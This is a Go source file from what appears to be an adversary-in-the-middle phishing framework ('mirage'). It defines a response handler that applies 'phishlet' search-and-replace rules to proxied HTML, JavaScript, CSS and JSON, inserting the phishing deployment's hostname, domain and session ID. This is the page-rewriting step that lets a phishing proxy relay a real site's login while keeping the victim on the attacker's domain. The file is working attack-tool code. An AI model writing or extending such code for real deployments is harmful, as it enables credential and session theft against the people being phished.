package response

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

var mutableMIMEPrefixes = []string{
	"text/html", "text/css", "text/javascript",
	"application/javascript", "application/json",
	"application/x-javascript", "image/svg+xml",
}

// SubFilterApplier applies phishlet search/replace rules to response bodies.
type SubFilterApplier struct{}

func (h *SubFilterApplier) Name() string { return "SubFilterApplier" }

func (h *SubFilterApplier) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	if ctx.Phishlet == nil {
		return nil
	}
	contentType := resp.Header.Get("Content-Type")
	if !isMutableMIME(contentType) {
		return nil
	}
	bodyBytes, err := readBody(resp)
	if err != nil {
		return err
	}
	for _, subFilter := range ctx.Phishlet.SubFilters {
		if !subFilter.MatchesMIME(contentType) {
			continue
		}
		if subFilter.Hostname != "" && resp.Request != nil &&
			!strings.HasSuffix(strings.ToLower(resp.Request.Host), strings.ToLower(subFilter.Hostname)) {
			continue
		}
		replacement := expandTemplate(subFilter.Replace, ctx)
		bodyBytes = subFilter.Search.ReplaceAll(bodyBytes, []byte(replacement))
	}
	replaceBody(resp, bodyBytes)
	return nil
}

func isMutableMIME(contentType string) bool {
	for _, prefix := range mutableMIMEPrefixes {
		if strings.HasPrefix(contentType, prefix) {
			return true
		}
	}
	return false
}

func readBody(resp *http.Response) ([]byte, error) {
	if resp.Body == nil {
		return nil, nil
	}
	bodyBytes, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		return nil, fmt.Errorf("reading response body: %w", err)
	}
	return bodyBytes, nil
}

func replaceBody(resp *http.Response, bodyBytes []byte) {
	resp.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	resp.ContentLength = int64(len(bodyBytes))
}

func expandTemplate(tmpl string, ctx *aitm.ProxyContext) string {
	result := tmpl
	if ctx.Deployment != nil {
		result = strings.ReplaceAll(result, "{hostname}", ctx.Deployment.Hostname)
		result = strings.ReplaceAll(result, "{domain}", ctx.Deployment.BaseDomain)
	}
	if ctx.Session != nil {
		result = strings.ReplaceAll(result, "{session_id}", ctx.Session.ID)
	}
	return result
}

var _ proxy.ResponseHandler = (*SubFilterApplier)(nil)
